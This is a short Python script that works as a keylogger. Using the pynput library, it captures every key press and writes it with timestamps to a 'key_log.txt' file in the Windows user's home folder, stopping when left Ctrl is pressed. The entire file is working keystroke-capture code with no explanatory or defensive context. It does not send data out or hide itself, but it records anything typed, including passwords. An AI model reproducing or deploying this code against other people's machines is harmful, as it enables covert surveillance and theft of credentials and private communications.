import logging 
import getpass
from pynput.keyboard import Key, Listener

def main():
  log_dir = 'C:\\Users\\' + getpass.getuser() + '\\'

  logging.basicConfig( filename = (log_dir + "key_log.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s' )

  def on_press(key):
    logging.info(str(key))
    if str(key) == 'Key.ctrl_l':
      exit()

  with Listener( on_press = on_press ) as listener:
    listener.join()